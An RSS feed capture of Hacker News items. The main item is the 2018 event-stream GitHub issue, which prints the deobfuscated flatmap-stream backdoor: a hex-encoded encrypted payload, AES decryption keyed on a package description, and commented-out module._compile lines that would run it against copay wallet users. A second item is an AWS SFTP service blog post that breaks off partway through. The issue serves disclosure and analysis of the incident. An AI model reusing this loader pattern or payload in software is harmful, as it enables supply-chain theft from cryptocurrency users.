<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=hnrss.org%2Fnewest%3Fpoints%3D200&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://hnrss.org/newest?points=200" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dhnrss.org%252Fnewest%253Fpoints%253D200%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dhnrss.org%252Fnewest%253Fpoints%253D200%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>Hacker News: Newest</title>
<link>https://news.ycombinator.com/newest</link>
<description>Hacker News RSS</description>
<item>
<title>Backdoor in event-stream library dependency</title>
<link>https://github.com/dominictarr/event-stream/issues/116</link>
<guid isPermaLink="true" >https://github.com/dominictarr/event-stream/issues/116</guid>
<description>
&lt;p&gt;&lt;strong&gt;EDIT 26/11/2018&lt;/strong&gt;:&lt;/p&gt;
&lt;ul readability=&quot;5.2188139059305&quot;&gt;&lt;li readability=&quot;6.8925143953935&quot;&gt;
&lt;p&gt;&lt;strong&gt;Am I affected?&lt;/strong&gt;:&lt;br/&gt;If you are using anything crypto-currency related, then maybe. As discovered by &lt;a class=&quot;user-mention&quot; data-hovercard-type=&quot;user&quot; data-hovercard-url=&quot;/hovercards?user_id=3067361&quot; data-octo-click=&quot;hovercard-link-click&quot; data-octo-dimensions=&quot;link_type:self&quot; href=&quot;https://github.com/maths22&quot;&gt;@maths22&lt;/a&gt;, the target seems to have been identified as copay related libraries. It only executes successfully when a matching package is in use (assumed to be copay at this point). If you are using a crypto-currency related library and if you see &lt;code&gt;flatmap-stream@0.1.1&lt;/code&gt; after running &lt;code&gt;npm ls event-stream flatmap-stream&lt;/code&gt;, you are most likely affected. For example:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ npm ls event-stream flatmap-stream
...
flatmap-stream@0.1.1
...
&lt;/code&gt;
&lt;/pre&gt;&lt;/li&gt;
&lt;li readability=&quot;-0.69565217391304&quot;&gt;
&lt;p&gt;&lt;strong&gt;What does it do&lt;/strong&gt;:&lt;br/&gt;Other users have done some good analysis of what these payloads actually do.&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;2&quot;&gt;
&lt;p&gt;&lt;strong&gt;What can I do&lt;/strong&gt;:&lt;br/&gt;By this time fixes are being deployed and npm has yanked the malicious version. Ensure that the developer(s) of the package you are using are aware of this post. If you are a developer update your event-stream dependency to &lt;code&gt;event-stream@3.3.4&lt;/code&gt;. &lt;strong&gt;This protects people with cached versions of event-stream&lt;/strong&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;hr/&gt;&lt;p&gt;&lt;a class=&quot;user-mention&quot; data-hovercard-type=&quot;user&quot; data-hovercard-url=&quot;/hovercards?user_id=259374&quot; data-octo-click=&quot;hovercard-link-click&quot; data-octo-dimensions=&quot;link_type:self&quot; href=&quot;https://github.com/dominictarr&quot;&gt;@dominictarr&lt;/a&gt; Why was &lt;a class=&quot;user-mention&quot; data-hovercard-type=&quot;user&quot; data-hovercard-url=&quot;/hovercards?user_id=32650542&quot; data-octo-click=&quot;hovercard-link-click&quot; data-octo-dimensions=&quot;link_type:self&quot; href=&quot;https://github.com/right9ctrl&quot;&gt;@right9ctrl&lt;/a&gt; given access to this repo? He added &lt;a href=&quot;https://github.com/hugeglass/flatmap-stream&quot;&gt;flatmap-stream&lt;/a&gt; which is entirely (1 commit to the repo but has 3 versions, the latest one removes the injection, unmaintained, created 3 months ago) an injection targeting &lt;a href=&quot;https://github.com/indexzero/ps-tree&quot;&gt;ps-tree&lt;/a&gt;. After he adds it at almost the exact same time the injection is added to &lt;code&gt;flatmap-stream&lt;/code&gt;, he bumps the version and publishes. Literally the second commit (3 days later) after that he removes the injection and bumps a major version so he can clear the repo of having &lt;code&gt;flatmap-stream&lt;/code&gt; but still have everyone (millions of weekly installs) using 3.x affected.&lt;/p&gt;
&lt;p&gt;&lt;a class=&quot;user-mention&quot; data-hovercard-type=&quot;user&quot; data-hovercard-url=&quot;/hovercards?user_id=32650542&quot; data-octo-click=&quot;hovercard-link-click&quot; data-octo-dimensions=&quot;link_type:self&quot; href=&quot;https://github.com/right9ctrl&quot;&gt;@right9ctrl&lt;/a&gt; If you removed flatmap-stream because your realized it was an injection attack why didn't you yank &lt;code&gt;event-stream@3.3.6&lt;/code&gt; from npm and put a PSA? If you didn't know, why did you choose to use a completely unused/unknown library (0 downloads on npm until you use it)? If I had the exact date from npm in which &lt;code&gt;flatmap-stream@0.1.1&lt;/code&gt; was published I wouldn't be asking you questions.&lt;/p&gt;
&lt;p&gt;I've included a break down of what I have so far on &lt;code&gt;flatmap-stream&lt;/code&gt; below. It includes the portion of code not found in the &lt;strong&gt;unminified&lt;/strong&gt; source of &lt;code&gt;flatmap-stream@0.1.1&lt;/code&gt; but found in the &lt;strong&gt;minified&lt;/strong&gt; source. The code has been cleaned up a little to get a better understanding.&lt;/p&gt;
&lt;p&gt;The worst part is I still don't even know what this does... The decrypted data n[0] is byte code or something, not regular javascript, or maybe I'm just not handling it correctly.&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-js&quot; readability=&quot;43&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; var r = require, t = process;&lt;/span&gt;

&lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; function e(r) {&lt;/span&gt;
&lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt;     return Buffer.from(r, &quot;hex&quot;).toString()&lt;/span&gt;
&lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; }&lt;/span&gt;
&lt;span class=&quot;pl-k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;decode&lt;/span&gt;(&lt;span class=&quot;pl-smi&quot;&gt;data&lt;/span&gt;) {
    &lt;span class=&quot;pl-k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;pl-smi&quot;&gt;Buffer&lt;/span&gt;.&lt;span class=&quot;pl-en&quot;&gt;from&lt;/span&gt;(data, &lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;hex&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;).&lt;span class=&quot;pl-c1&quot;&gt;toString&lt;/span&gt;()
}

&lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; var n = r(e(&quot;2e2f746573742f64617461&quot;)),&lt;/span&gt;
&lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; var n = require(decode(&quot;2e2f746573742f64617461&quot;))&lt;/span&gt;
&lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; var n = require('./test/data')&lt;/span&gt;
var n = [&quot;75d4c87f3f69e0fa292969072c49dff4f90f44c1385d8eb60dae4cc3a229e52cf61f78b0822353b4304e323ad563bc22c98421eb6a8c1917e30277f716452ee8d57f9838e00f0c4e4ebd7818653f00e72888a4031676d8e2a80ca3cb00a7396ae3d140135d97c6db00cab172cbf9a92d0b9fb0f73ff2ee4d38c7f6f4b30990f2c97ef39ae6ac6c828f5892dd8457ab530a519cd236ebd51e1703bcfca8f9441c2664903af7e527c420d9263f4af58ccb5843187aa0da1cbb4b6aedfd1bdc6faf32f38a885628612660af8630597969125c917dfc512c53453c96c143a2a058ba91bc37e265b44c5874e594caaf53961c82904a95f1dd33b94e4dd1d00e9878f66dafc55fa6f2f77ec7e7e8fe28e4f959eab4707557b263ec74b2764033cd343199eeb6140a6284cb009a09b143dce784c2cd40dc320777deea6fbdf183f787fa7dd3ce2139999343b488a4f5bcf3743eecf0d30928727025ff3549808f7f711c9f7614148cf43c8aa7ce9b3fcc1cff4bb0df75cb2021d0f4afe5784fa80fed245ee3f0911762fffbc36951a78457b94629f067c1f12927cdf97699656f4a2c4429f1279c4ebacde10fa7a6f5c44b14bc88322a3f06bb0847f0456e630888e5b6c3f2b8f8489cd6bc082c8063eb03dd665badaf2a020f1448f3ae268c8d176e1d80cc756dc3fa02204e7a2f74b9da97f95644792ee87f1471b4c0d735589fc58b5c98fb21c8a8db551b90ce60d88e3f756cc6c8c4094aeaa12b149463a612ea5ea5425e43f223eb8071d7b991cfdf4ed59a96ccbe5bdb373d8febd00f8c7effa57f06116d850c2d9892582724b3585f1d71de83d54797a0bfceeb4670982232800a9b695d824a7ada3d41e568ecaa6629&quot;,&quot;db67fdbfc39c249c6f338194555a41928413b792ff41855e27752e227ba81571483c631bc659563d071bf39277ac3316bd2e1fd865d5ba0be0bbbef3080eb5f6dfdf43b4a678685aa65f30128f8f36633f05285af182be8efe34a2a8f6c9c6663d4af8414baaccd490d6e577b6b57bf7f4d9de5c71ee6bbffd70015a768218a991e1719b5428354d10449f41bac70e5afb1a3e03a52b89a19d4cc333e43b677f4ec750bf0be23fb50f235dd6019058fbc3077c01d013142d9018b076698536d2536b7a1a6a48f5485871f7dc487419e862b1a7493d840f14e8070c8eff54da8013fd3fe103db2ecebc121f82919efb697c2c47f79516708def7accd883d980d5618efd408c0fd46fd387911d1e72e16cf8842c5fe3477e4b46aa7bb34e3cf9caddfca744b6a21b5457beaccff83fa6fb6e8f3876e4764e0d4b5318e7f3eed34af757eb240615591d5369d4ab1493c8a9c366dfa3981b92405e5ebcbfd5dca2c6f9b8e8890a4635254e1bc26d2f7a986e29fef6e67f9a55b6faec78d54eb08cb2f8ea785713b2ffd694e7562cf2b06d38a0f97d0b546b9a121620b7f9d9ccca51b5e74df4bdd82d2a5e336a1d6452912650cc2e8ffc41bd7aa17ab17f60b2bd0cfc0c35ed82c71c0662980f1242c4523fae7a85ccd5e821fe239bfb33d38df78099fd34f429d75117e39b888344d57290b21732f267c22681e4f640bec9437b756d3002a3135564f1c5947cc7c96e1370db7af6db24c9030fb216d0ac1d9b2ca17cb3b3d5955ffcc3237973685a2c078e10bc6e36717b1324022c8840b9a755cffdef6a4d1880a4b6072fd1eb7aabebb9b949e1e37be6dfb6437c3fd0e6f135bcea65e2a06eb35ff26dcf2b2772f8d0cde8e5fa5eec577e9754f6b044502f8ce8838d36827bd3fe91cccba2a04c3ee90c133352cbad34951fdf21a671a4e3940fd69cfee172df4123a0f678154871afa80f763d78df971a1317200d0ce5304b3f01ace921ea8afb41ec800ab834d81740353101408733fb710e99657554c50a4a8cb0a51477a07d6870b681cdc0be0600d912a0c711dc9442260265d50e269f02eb49da509592e0996d02a36a0ce040fff7bd3be57e97d07e4de0cdb93b7e3ccea422a5a526fb95ea8508ea2a40010f56d4aa96da23e6e9bcbae09dacccdcd8ac6af96a1922266c3795fb0798affaa75b8ae05221612ce45c824d1f6603fe2afd74b9e167736bfffe01a12b9f85912572a291336c693f133efeac881cd09207505ad93967e3b7a8972cdcce208bfa3b9956370795791ca91a8b9deabde26c3ee2adb43e9f7df2df16d4582a4e610b73754e609b1eea936a4d916bf5ed9d627692bcc8ed0933026e9250d16bdaf2b68470608aeaffedcf2be8c4c176bfc620e3f9f17a4a9d8ef9fe46cca41a79878d37423c0fa9f3ee1f4e6d68f029d6cbb5cbc90e7243135e0fc1dd66297d32adabc9a6d0235709be173b688ba2004f518f58f5459caca60d615ae4dc0d0eeacbe48ca8727a8b42dc78396316a0e223029b76311e7607ea5bd236307ba3b62afeff7a1ef5c0b5d7ee760c0f6472359c57817c5d9cd534d9a34bb4847bbc83c37b14b6444e9f386f1bec4b42c65d1078d54bd007ff545028205099abc454919406408b761a1636d10e39ede9f650f25abad3219b9d46d535402b930488535d97d19be3b0e75fed31d0b2f8af099481685e2b4fa9bff05cbac1b9b405db2c7eae68501633e02723560727a1c8c34c32afc76cdeb82fe8bae34b09cd82402076b9f481d043b080d851c7b6ba8613adba3bc3d5edb9a84fce41130ad328fe4c062a76966cb60c4fa801f359d22b70a797a2c2a3d19da7383025cb2e076b9c30b862456ae4b60197101e82133748c224a1431545fde146d98723ccb79b47155b218914c76f5d52027c06c6c913450fc56527a34c3fe1349f38018a55910de819add6204ab2829668ca0b7afb0d00f00c873a3f18daad9ae662b09c775cddbe98b9e7a43f1f8318665027636d1de18b5a77f548e9ede3b73e3777c44ec962fb7a94c56d8b34c1da603b3fc250799aad48cc007263daf8969dbe9f8ade2ac66f5b66657d8b56050ff14d8f759dd2c7c0411d92157531cfc3ac9c981e327fd6b140fb2abf994fa91aecc2c4fef5f210f52d487f117873df6e847769c06db7f8642cd2426b6ce00d6218413fdbba5bbbebc4e94bffdef6985a0e800132fe5821e62f2c1d79ddb5656bd5102176d33d79cf4560453ca7fd3d3c3be0190ae356efaaf5e2892f0d80c437eade2d28698148e72fbe17f1fac993a1314052345b701d65bb0ea3710145df687bb17182cd3ad6c121afef20bf02e0100fd63cbbf498321795372398c983eb31f184fa1adbb24759e395def34e1a726c3604591b67928da6c6a8c5f96808edfc7990a585411ffe633bae6a3ed6c132b1547237cab6f3b24c57d3d4cd8e2fbbd9f7674ececf0f66b39c2591330acc1ac20732a98e9b61a3fd979f88ab7211acbf629fcb0c80fb5ed1ea55df0735dcf13510304652763a5ed7bde3e5ebda1bf72110789ebefa469b70f6b4add29ce1471fa6972df108717100412c804efcf8aaba277f0107b1c51f15f144ab02dd8f334d5b48caf24a4492979fa425c4c25c4d213408ecfeb82f34e7d20f26f65fa4e89db57582d6a928914ee6fc0c6cc0a9793aa032883ea5a2d2135dbfcf762f4a2e22585966be376d30fbfabb1dfd182e7b174097481763c04f5d7cbd060c5a36dc0e3dd235de1669f3db8747d5b74d8c1cc9ab3a919e257fb7e6809f15ab7c2506437ced02f03416a1240a555f842a11cde514c450a2f8536f25c60bbe0e1b013d8dd407e4cb171216e30835af7ca0d9e3ff33451c6236704b814c800ecc6833a0e66cd2c487862172bc8a1acb7786ddc4e05ba4e41ada15e0d6334a8bf51373722c26b96bbe4d704386469752d2cda5ca73f7399ff0df165abb720810a4dc19f76ca748a34cb3d0f9b0d800d7657f702284c6e818080d4d9c6fff481f76fb7a7c5d513eae7aa84484822f98a183e192f71ea4e53a45415ddb03039549b18bc6e1&quot;,&quot;63727970746f&quot;,&quot;656e76&quot;,&quot;6e706d5f7061636b6167655f6465736372697074696f6e&quot;,&quot;616573323536&quot;,&quot;6372656174654465636970686572&quot;,&quot;5f636f6d70696c65&quot;,&quot;686578&quot;,&quot;75746638&quot;]
    &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; o = t[e(n[3])][e(n[4])];&lt;/span&gt;
    &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; npm_package_description = process[decode(n[3])][decode(n[4])];&lt;/span&gt;
    &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; npm_package_description = process['env']['npm_package_description'];&lt;/span&gt;
    npm_package_description &lt;span class=&quot;pl-k&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;Get all children of a pid&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt;; &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; Description from ps-tree (this is the aes decryption key)&lt;/span&gt;

&lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; if (!o) return;&lt;/span&gt;
&lt;span class=&quot;pl-k&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;pl-k&quot;&gt;!&lt;/span&gt;npm_package_description) &lt;span class=&quot;pl-k&quot;&gt;return&lt;/span&gt;;

&lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; var u = r(e(n[2]))[e(n[6])](e(n[5]), o),&lt;/span&gt;
&lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; var decipher = require(decode(n[2]))[decode(n[6])](decode(n[5]), npm_package_description),&lt;/span&gt;
&lt;span class=&quot;pl-k&quot;&gt;var&lt;/span&gt; decipher &lt;span class=&quot;pl-k&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;crypto&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt;)[&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;createDecipher&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt;](&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;aes256&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt;, npm_package_description),

    &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; a = u.update(n[0], e(n[8]), e(n[9]));&lt;/span&gt;
    &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; decoded = decipher.update(n[0], e(n[8]), e(n[9]));&lt;/span&gt;
    decoded &lt;span class=&quot;pl-k&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;pl-smi&quot;&gt;decipher&lt;/span&gt;.&lt;span class=&quot;pl-en&quot;&gt;update&lt;/span&gt;(n[&lt;span class=&quot;pl-c1&quot;&gt;0&lt;/span&gt;], &lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;hex&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt;, &lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;utf8&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt;);

&lt;span class=&quot;pl-en&quot;&gt;console&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;log&lt;/span&gt;(n); &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; IDK why this is here...&lt;/span&gt;

&lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; a += u.final(e(n[9]));&lt;/span&gt;
decoded &lt;span class=&quot;pl-k&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;pl-smi&quot;&gt;decipher&lt;/span&gt;.&lt;span class=&quot;pl-en&quot;&gt;final&lt;/span&gt;(&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;utf8&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt;);

&lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; var f = new module.constructor;&lt;/span&gt;
&lt;span class=&quot;pl-k&quot;&gt;var&lt;/span&gt; newModule &lt;span class=&quot;pl-k&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;module.constructor&lt;/span&gt;;

&lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;/**&lt;/span&gt;************** DO NOT UNCOMMENT [THIS RUNS THE CODE] *************&lt;span class=&quot;pl-c&quot;&gt;*/&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; f.paths = module.paths, f[e(n[7])](a, &quot;&quot;), f.exports(n[1])&lt;/span&gt;
&lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; newModule.paths = module.paths, newModule['_compile'](decoded, &quot;&quot;), newModule.exports(n[1])&lt;/span&gt;
&lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; newModule.paths = module.paths&lt;/span&gt;
&lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; newModule['_compile'](decoded, &quot;&quot;) // Module.prototype._compile = function(content, filename)&lt;/span&gt;
&lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; newModule.exports(n[1])&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
</description>
<pubDate>Mon, 26 Nov 2018 16:20:26 +0000</pubDate>
<dc:creator>cnorthwood</dc:creator>
<og:image>https://avatars2.githubusercontent.com/u/2512197?s=400&amp;v=4</og:image>
<og:type>object</og:type>
<og:title>I don't know what to say. · Issue #116 · dominictarr/event-stream</og:title>
<og:url>https://github.com/dominictarr/event-stream/issues/116</og:url>
<og:description>EDIT 26/11/2018: Am I affected?: If you are using anything crypto-currency related, then maybe. As discovered by @maths22, the target seems to have been identified as copay related libraries. It on...</og:description>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://github.com/dominictarr/event-stream/issues/116</dc:identifier>
</item>
<item>
<title>AWS Transfer for SFTP – Fully Managed SFTP Service for Amazon S3</title>
<link>https://aws.amazon.com/blogs/aws/new-aws-transfer-for-sftp-fully-managed-sftp-service-for-amazon-s3/</link>
<guid isPermaLink="true" >https://aws.amazon.com/blogs/aws/new-aws-transfer-for-sftp-fully-managed-sftp-service-for-amazon-s3/</guid>
<description>&lt;table id=&quot;amazon-polly-audio-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td id=&quot;amazon-polly-audio-tab&quot;&gt;


&lt;div id=&quot;amazon-polly-by-tab&quot;&gt;&lt;a href=&quot;https://aws.amazon.com/polly/&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;&lt;img src=&quot;https://a0.awsstatic.com/aws-blog/images/Voiced_by_Amazon_Polly_EN.png&quot; width=&quot;554&quot; height=&quot;56&quot;/&gt;&lt;/a&gt;&lt;/div&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;Many organizations use &lt;a href=&quot;https://en.wikipedia.org/wiki/SSH_File_Transfer_Protocol&quot;&gt;SFTP&lt;/a&gt; (Secure File Transfer Protocol) as part of long-established data processing and partner integration workflows. While it would be easy to dismiss these systems as “legacy,” the reality is that they serve a useful purpose and will continue to do so for quite some time. We want to help our customers to move these workflows to the cloud in a smooth, non-disruptive way.&lt;/p&gt;&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span title=&quot;&quot;&gt;AWS Transfer for SFTP&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;br/&gt;Today we are launching &lt;span title=&quot;&quot;&gt;AWS Transfer for SFTP&lt;/span&gt;, a fully-managed, highly-available SFTP service. You simply create a server, set up user accounts, and associate the server with one or more &lt;a href=&quot;https://aws.amazon.com/s3/&quot; title=&quot;&quot;&gt;Amazon Simple Storage Service (S3)&lt;/a&gt; buckets. You have fine-grained control over user identity, permissions, and keys. You can create users within &lt;span title=&quot;&quot;&gt;Transfer for SFTP&lt;/span&gt;, or you can make use of an existing identity provider. You can also use IAM policies to control the level of access granted to each user. You can also make use of your existing DNS name and SSH public keys, making it easy for you to migrate to &lt;span title=&quot;&quot;&gt;Transfer for SFTP&lt;/span&gt;. Your customers and your partners will continue to connect and to make transfers as usual, with no changes to their existing workflows.&lt;/p&gt;
&lt;p&gt;You have full access to the underlying S3 buckets and you can make use of many different S3 features including &lt;a href=&quot;https://docs.aws.amazon.com/AmazonS3/latest/user-guide/create-lifecycle.html&quot;&gt;lifecycle policies&lt;/a&gt;, multiple &lt;a href=&quot;https://docs.aws.amazon.com/AmazonS3/latest/dev/storage-class-intro.html&quot;&gt;storage classes&lt;/a&gt;, several options for &lt;a href=&quot;https://docs.aws.amazon.com/AmazonS3/latest/dev/serv-side-encryption.html&quot;&gt;server-side encryption&lt;/a&gt;, &lt;a href=&quot;https://docs.aws.amazon.com/AmazonS3/latest/dev/Versioning.html&quot;&gt;versioning&lt;/a&gt;, and so forth. You can write &lt;a href=&quot;https://aws.amazon.com/lambda/&quot; title=&quot;&quot;&gt;AWS Lambda&lt;/a&gt; functions to to build an “intelligent” FTP site that processes incoming files as soon as they are uploaded, query the files &lt;em&gt;in situ&lt;/em&gt; using &lt;a href=&quot;https://aws.amazon.com/athena&quot; title=&quot;&quot;&gt;Amazon Athena&lt;/a&gt;, and easily connect to your existing data ingestion process. On the outbound side, you can generate reports, documents, manifests, custom software builds and so forth using other AWS services, and then store them in S3 for each, controlled distribution to your customers and partners.&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;Creating a Server&lt;/strong&gt;&lt;/span&gt;&lt;br/&gt;To get started, I open up the &lt;span title=&quot;&quot;&gt;AWS Transfer for SFTP&lt;/span&gt; Console and click &lt;strong&gt;Create server&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;&lt;img class=&quot;aligncenter size-medium&quot; src=&quot;https://media.amazonwebservices.com/blog/2018/ts_con_main_1.png&quot; width=&quot;900&quot; height=&quot;565&quot;/&gt;&lt;/p&gt;
&lt;p&gt;I can have &lt;span title=&quot;&quot;&gt;Transfer for SFTP&lt;/span&gt; manage user names and passwords, or I can access an existing LDAP or Active Directory identify provider via API Gateway. I can use a &lt;a href=&quot;https://aws.amazon.com/route53/&quot; title=&quot;&quot;&gt;Amazon Route 53&lt;/a&gt; DNS alias or an existing hostname, and I can tag my server. I start with default values and click &lt;strong&gt;Create server&lt;/strong&gt; to actually create my SFTP server:&lt;/p&gt;
&lt;p&gt;&lt;img class=&quot;aligncenter size-medium&quot; src=&quot;https://media.amazonwebservices.com/blog/2018/ts_create_server_1.png&quot; width=&quot;900&quot; height=&quot;841&quot;/&gt;&lt;/p&gt;
&lt;p&gt;It is up and running within minutes:&lt;/p&gt;
&lt;p&gt;&lt;img class=&quot;aligncenter size-medium&quot; src=&quot;https://media.amazonwebservices.com/blog/2018/ts_online_1.png&quot; width=&quot;900&quot; height=&quot;249&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Now I can add a user or two! I select the server and click &lt;strong&gt;Add user,&lt;/strong&gt; then enter the user name, pick the S3 bucket (with an optional prefix) for their home directory, and select an IAM role that gives the user the desired access to the bucket. Then I paste the SSH public key (created with &lt;a href=&quot;https://www.ssh.com/ssh/keygen/&quot;&gt;ssh-keygen&lt;/a&gt;), and click &lt;strong&gt;Add&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;&lt;img class=&quot;aligncenter size-medium&quot; src=&quot;https://media.amazonwebservices.com/blog/2018/ts_add_user_1.png&quot; width=&quot;900&quot; height=&quot;1127&quot;/&gt;&lt;/p&gt;
&lt;p&gt;And now I am all set. I retrieve the server endpoint from the console and issue my first sftp command:&lt;/p&gt;
&lt;p&gt;&lt;img class=&quot;aligncenter size-medium&quot; src=&quot;https://media.amazonwebservices.com/blog/2018/ts_connect_put_1.png&quot; width=&quot;900&quot; height=&quot;281&quot;/&gt;&lt;/p&gt;
&lt;p&gt;The files are visible in the &lt;strong&gt;jeff/&lt;/strong&gt; section of the S3 bucket immediately:&lt;/p&gt;
&lt;p&gt;&lt;img class=&quot;aligncenter size-medium&quot; src=&quot;https://media.amazonwebservices.com/blog/2018/ts_files_1.png&quot; width=&quot;660&quot; height=&quot;486&quot;/&gt;&lt;/p&gt;
&lt;p&gt;I could attach a Lambda function to the bucket and do any sort of post-upload processing I want. For example, I could run all uploaded images through &lt;a href=&quot;https://aws.amazon.com/rekognition/&quot; title=&quot;&quot;&gt;Amazon Rekognition&lt;/a&gt; and route them to one of several different destinations depending on the types of objects that it contains, and I could run audio files through &lt;a href=&quot;https://aws.amazon.com/comprehend/&quot; title=&quot;&quot;&gt;Amazon Comprehend&lt;/a&gt; to perform a speech to text operation.&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;Full Control via IAM&lt;/strong&gt;&lt;/span&gt;&lt;br/&gt;In order to get right to the point in my walk-through, my IAM role uses this very simple policy:&lt;/p&gt;
&lt;div class=&quot;hide-language&quot; readability=&quot;20&quot;&gt;
&lt;pre class=&quot;unlimited-height-code&quot;&gt;
&lt;code class=&quot;lang-json&quot;&gt;{
    &quot;Version&quot;: &quot;2012-10-17&quot;,
    &quot;Statement&quot;: [
        {
            &quot;Effect&quot;: &quot;Allow&quot;,
            &quot;Action&quot;: [
                &quot;s3:ListAllMyBuckets&quot;,
                &quot;s3:GetBucketLocation&quot;
            ],
